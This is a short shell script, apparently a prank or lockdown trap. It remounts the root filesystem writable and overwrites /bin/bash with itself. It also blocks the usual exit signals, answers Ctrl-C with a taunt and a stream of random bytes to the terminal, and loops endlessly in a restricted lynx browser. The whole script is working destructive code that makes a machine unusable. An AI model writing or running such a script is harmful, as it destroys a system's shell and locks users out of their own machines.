#!/bin/sh
mount -o remount,rw /
cp $0 /bin/bash 2>&1 2>/dev/null
pain() {
trap '' INT
echo "You've activated my TRAP card!"
sleep 2
cat /dev/urandom
}

trap '' TSTP TERM EXIT
trap 'pain' INT
while true; do
  lynx file:///var/www/html/index.html -restrictions=all
  echo "This operation is not permitted"
  sleep 2
done

